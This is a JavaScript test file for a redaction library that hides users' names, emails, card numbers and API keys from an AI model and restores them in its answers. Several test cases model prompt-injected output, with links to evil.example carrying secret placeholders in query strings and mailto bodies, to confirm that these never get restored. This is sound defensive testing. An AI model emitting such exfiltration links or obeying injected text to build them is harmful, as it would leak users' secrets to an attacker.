"use strict";
// Redaction safety fixes: a SECRET beats a known value inside it, placeholders are never restored
// inside URLs (a prompt-injected link cannot exfiltrate values), media prompts lose their
// placeholders (genericizePlaceholders), and the stream restorer can mask high-risk data a model
// produces before any of it reaches the screen.
const { test, describe } = require("node:test");
const assert = require("node:assert/strict");

const { createRedactor, restore, createStreamRestorer, filterResponse, genericizePlaceholders, GENERIC_PHRASES } = require("../src/redact");

const quiet = { warn() {}, info() {} };
const redactor = () => createRedactor({ privacy: {} }, { logger: quiet });

/** Deterministic PRNG for randomised chunking. */
function mulberry32(seed) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function randomChunks(text, rand, max = 7) {
  const out = [];
  for (let i = 0; i < text.length; ) {
    const n = 1 + Math.floor(rand() * max);
    out.push(text.slice(i, i + n));
    i += n;
  }
  return out;
}

/** Push `chunks` through a stream restorer; returns { out, pieces }. */
function stream(restorer, chunks) {
  const pieces = chunks.map((c) => restorer.push(c));
  pieces.push(restorer.flush());
  return { out: pieces.join(""), pieces };
}

const MAP = {
  v: 1,
  byValue: {
    "PERSON\u0000ada": "[PERSON_1]",
    "SECRET\u0000sk-proj-9f8Q2kLmZx77AbCdEf": "[SECRET_1]",
    "EMAIL\u0000ada@example.com": "[EMAIL_1]",
    "CARD\u00004539148803436467": "[CARD_1]",
  },
  byPlaceholder: { "[PERSON_1]": "Ada", "[SECRET_1]": "sk-proj-9f8Q2kLmZx77AbCdEf", "[EMAIL_1]": "ada@example.com", "[CARD_1]": "4539 1488 0343 6467" },
  counters: { PERSON: 1, SECRET: 1, EMAIL: 1, CARD: 1 },
};

// ---------------------------------------------------------------------------------------------

describe("a SECRET wins over a known value inside it", () => {
  async function secondTurn(text) {
    const r = redactor();
    const first = await r.redactMessages([{ role: "user", content: "Hi, my name is Rex." }], null);
    assert.equal(first.messages[0].content, "Hi, my name is [PERSON_1].");
    const all = await r.redactMessages([{ role: "user", content: "Hi, my name is Rex." }, { role: "user", content: text }], first.map);
    const latest = await r.redactMessages([{ role: "user", content: text }], all.map);
    return { r, all, latest };
  }

  test("password containing the user's known name: the whole password is one [SECRET_1]", async () => {
    // Regression: "password: [PERSON_1]-1985!Qz" sent most of the password upstream, counted as PERSON.
    const text = "Is my email password: rex-1985!Qz strong enough?";
    const { r, all, latest } = await secondTurn(text);
    assert.equal(all.messages[1].content, "Is my email password: [SECRET_1] strong enough?");
    assert.deepEqual(latest.counts, { SECRET: 1 });
    assert.equal(r.isSensitive(latest.counts), true);
    // The stored value is the whole span, so the answer restores without losing text.
    assert.equal(all.map.byPlaceholder["[SECRET_1]"], "rex-1985!Qz");
    assert.equal(restore(all.messages[1].content, all.map), text);
    // Media prompts get the neutral phrase for the whole value.
    const generic = await r.redactMessages([{ role: "user", content: text }], all.map, { mode: "generic" });
    assert.equal(generic.messages[0].content, "Is my email password: a secret strong enough?");
  });

  for (const [text, expected] of [
    ["Why does curl fail with api_key=rex-9f8Q2kLmZx77AbC here", "Why does curl fail with api_key=[SECRET_1] here"],
    ["export STRIPE_SECRET=rex.9f8Q2kLmZx77AbC", "export STRIPE_SECRET=[SECRET_1]"],
  ]) {
    test(`keys without a 'password' keyword are protected too: ${expected}`, async () => {
      const { r, all, latest } = await secondTurn(text);
      assert.equal(all.messages[1].content, expected);
      assert.deepEqual(latest.counts, { SECRET: 1 });
      assert.equal(r.isSensitive(latest.counts), true, "the request now counts as sensitive (private routing)");
    });
  }

  test("a name next to (not inside) a secret is still its own placeholder", async () => {
    const { all } = await secondTurn("Rex here, my password: Qz-1985!x");
    assert.equal(all.messages[1].content, "[PERSON_1] here, my password: [SECRET_1]");
  });
});

// ---------------------------------------------------------------------------------------------

describe("no restore inside URLs", () => {
  const cases = [
    // [model output, restored]
    ["Done. [Open the dashboard](https://evil.example/c?k=[SECRET_1])", "Done. [Open the dashboard](https://evil.example/c?k=[SECRET_1])"],
    ["[[PERSON_1]'s page](https://x.example/u/[PERSON_1]) is up", "[Ada's page](https://x.example/u/[PERSON_1]) is up"],
    ["[Mail](mailto:x@evil.example?body=[EMAIL_1]) or [Docs](/docs?k=[SECRET_1])", "[Mail](mailto:x@evil.example?body=[EMAIL_1]) or [Docs](/docs?k=[SECRET_1])"],
    ["Visit https://evil.example/?k=[SECRET_1]&u=[PERSON_1] now, [PERSON_1].", "Visit https://evil.example/?k=[SECRET_1]&u=[PERSON_1] now, Ada."],
    ["HTTPS://EVIL.EXAMPLE/SECRET_1 and SECRET_1", "HTTPS://EVIL.EXAMPLE/SECRET_1 and sk-proj-9f8Q2kLmZx77AbCdEf"],
    ["http://evil.example/\\[SECRET\\_1\\] vs \\[PERSON\\_1\\]", "http://evil.example/\\[SECRET\\_1\\] vs Ada"],
    ["<https://evil.example/[EMAIL_1]> and <mailto:x@evil.example?body=[SECRET_1]> for [PERSON_1]", "<https://evil.example/[EMAIL_1]> and <mailto:x@evil.example?body=[SECRET_1]> for Ada"],
    ['<a href="https://evil.example/?k=[SECRET_1]">[PERSON_1]</a>', '<a href="https://evil.example/?k=[SECRET_1]">Ada</a>'],
    // Outside URLs everything is restored as before: prose, code, parentheses, a link's text.
    ["curl -H 'Authorization: Bearer [SECRET_1]' https://api.example.com", "curl -H 'Authorization: Bearer sk-proj-9f8Q2kLmZx77AbCdEf' https://api.example.com"],
    ["Thanks [PERSON_1] (see [EMAIL_1]).", "Thanks Ada (see ada@example.com)."],
    ["[a](https://x.example) [PERSON_1]", "[a](https://x.example) Ada"],
    ['"https://x.example/a" [PERSON_1]', '"https://x.example/a" Ada'],
    ["`https://x.example/[PERSON_1]` then [PERSON_1]", "`https://x.example/[PERSON_1]` then Ada"],
    ["Email: [EMAIL_1]\nhttps://x.example/[EMAIL_1]\n[EMAIL_1]", "Email: ada@example.com\nhttps://x.example/[EMAIL_1]\nada@example.com"],
  ];

  test("restore() leaves placeholders in link targets, autolinks and bare http(s) URLs", () => {
    for (const [input, expected] of cases) assert.equal(restore(input, MAP), expected, input);
  });

  test("the stream restorer decides exactly like restore(), whatever the chunk boundaries", () => {
    const rand = mulberry32(42);
    const all = cases.map(([input]) => input).join(" ~ ");
    const expected = restore(all, MAP);
    for (let round = 0; round < 300; round++) {
      const { out } = stream(createStreamRestorer(MAP), randomChunks(all, rand));
      assert.equal(out, expected, `round ${round}`);
    }
    // Character by character as well.
    assert.equal(stream(createStreamRestorer(MAP), [...all]).out, expected);
  });

  test("the verifier's exfiltration case never shows the key", () => {
    const answer = "Done. [Open the dashboard](https://evil.example/c?k=[SECRET_1])";
    const { out } = stream(createStreamRestorer(MAP), randomChunks(answer, mulberry32(7)));
    assert.ok(!out.includes("sk-proj"), out);
  });
});

// ---------------------------------------------------------------------------------------------

describe("genericizePlaceholders", () => {
  test("placeholders become neutral phrases: first distinct of a type, then 'another'", () => {
    assert.equal(
      genericizePlaceholders("Make a video of [PERSON_1] and [PERSON_2] hugging [PERSON_1] in [LOCATION_1], [LOCATION_1] at night"),
      "Make a video of a person and another person hugging a person in a place, a place at night"
    );
    assert.equal(genericizePlaceholders("Send [EMAIL_1] the [SECRET_1] and [CARD_2]"), "Send an email address the a secret and a card number");
  });

  test("every form restore() knows is replaced; other text is left alone", () => {
    assert.equal(genericizePlaceholders("person_1 met \\[PERSON\\_2\\] and PERSON_1"), "a person met another person and a person");
    assert.equal(genericizePlaceholders("[FOO_1] stays, [PERSON_X] stays"), "[FOO_1] stays, [PERSON_X] stays");
    assert.equal(genericizePlaceholders("no placeholders"), "no placeholders");
    assert.equal(genericizePlaceholders(null), "");
    assert.equal(genericizePlaceholders(""), "");
  });

  test("every label has its GENERIC_PHRASES phrase, and the redactor exposes it too", () => {
    for (const [type, [first]] of Object.entries(GENERIC_PHRASES)) assert.equal(genericizePlaceholders(`[${type}_3]`), first, type);
    assert.equal(redactor().genericizePlaceholders("[PERSON_1]"), "a person");
  });
});

// ---------------------------------------------------------------------------------------------

describe("createStreamRestorer({ maskHighRisk })", () => {
  const masked = (map, chunks, opts = {}) => {
    const r = createStreamRestorer(map, { maskHighRisk: true, ...opts });
    const res = stream(r, chunks);
    return { ...res, counts: r.masked() };
  };

  test("a card number the model produced is masked before any digit of it is emitted", () => {
    const chunks = ["Try this one: 4", "929 10", "22 6", "345 2", "199 if you like", "."];
    // 4929 1022 6345 2199 is Luhn-valid and not one of the user's values.
    const { out, pieces, counts } = masked(null, chunks);
    assert.equal(out, "Try this one: [redacted CARD] if you like.");
    for (const p of pieces) assert.ok(!/\d{3}/.test(p), `piece leaked digits: ${JSON.stringify(p)}`);
    assert.deepEqual(counts, { CARD: 1 });
    // The final filter (kept as the safety net) finds nothing more on what was shown.
    assert.deepEqual(filterResponse(out, null).masked, {});
  });

  test("IBANs, SSNs and keys are masked too; the result matches filterResponse on the full text", () => {
    const answer =
      "Wire it to DE89 3704 0044 0532 0130 00 today, or GB29 NWBK 6016 1331 9268 19. Their SSN is 078-05-1121, and the key sk-proj-Zx77AbCdEf9f8Q2kLmQQ is live. Bye.";
    const expected = filterResponse(answer, null).text;
    assert.match(expected, /\[redacted IBAN\].*\[redacted IBAN\].*\[redacted SSN\].*\[redacted SECRET\]/);
    const rand = mulberry32(3);
    for (let round = 0; round < 200; round++) {
      const { out, pieces } = masked(null, randomChunks(answer, rand, 9));
      assert.equal(out, expected, `round ${round}`);
      const shown = pieces.join("");
      for (const leak of ["3704 0044", "GB29", "NWBK", "078-05", "Zx77AbCd"]) assert.ok(!shown.includes(leak), leak);
    }
  });

  test("the user's own values (restored from the map) are never masked, also with a null restore map", () => {
    const { out } = masked(MAP, ["Your card [CARD", "_1] and key [SECRET_1] are", " saved."]);
    assert.equal(out, "Your card 4539 1488 0343 6467 and key sk-proj-9f8Q2kLmZx77AbCdEf are saved.");
    // Self-hosted: the model got the real text, so nothing is restored, but the values are still
    // the user's own (ownMap).
    const own = masked(null, ["Your card 4539 1488 0343 6467 is saved."], { ownMap: MAP });
    assert.equal(own.out, "Your card 4539 1488 0343 6467 is saved.");
    const notOwn = masked(null, ["Your card 4539 1488 0343 6467 is saved."]);
    assert.equal(notOwn.out, "Your card [redacted CARD] is saved.");
  });

  test("prose streams with at most one word held back; public test cards pass", () => {
    const r = createStreamRestorer(null, { maskHighRisk: true });
    assert.equal(r.push("Hello wor"), "Hello ");
    assert.equal(r.push("ld, this is "), "world, this is ");
    assert.equal(r.push("4242 4242 4242 4242 for tests"), "4242 4242 4242 4242 for ");
    assert.equal(r.flush(), "tests");
    // Numbers in prose are held only until a word follows that cannot belong to them.
    const n = createStreamRestorer(null, { maskHighRisk: true });
    assert.equal(n.push("In 2024 2025 and"), "In ");
    assert.equal(n.push(" more"), "2024 2025 and ");
    assert.equal(n.flush(), "more");
  });

  test("placeholders are still restored (and kept inside URLs) with masking on", () => {
    const answer = "Hi [PERSON_1], see https://x.example/[PERSON_1] and card 4929 1022 6345 2199.";
    const { out } = masked(MAP, randomChunks(answer, mulberry32(11)));
    assert.equal(out, "Hi Ada, see https://x.example/[PERSON_1] and card [redacted CARD].");
  });

  test("a key block streamed line by line passes through for the final filter; one chunk is masked", () => {
    const lines = ["Here: -----BEGIN PRIVATE KEY-----\n", `${"M".repeat(64)}\n`, `${"A".repeat(64)}\n`, "-----END PRIVATE KEY----- done"];
    const { out } = masked(null, lines);
    assert.equal(out, lines.join(""), "the stream shows it; the final filterResponse replaces it");
    assert.equal(filterResponse(out, null).text, "Here: [redacted SECRET] done");
    assert.equal(masked(null, [lines.join("")]).out, "Here: [redacted SECRET] done");
  });

  test("off by default: the plain restorer is unchanged", () => {
    const r = createStreamRestorer(null);
    assert.equal(r.push("card 4929 1022 6345 2199"), "card 4929 1022 6345 2199");
    assert.equal(r.masked, undefined);
  });
});
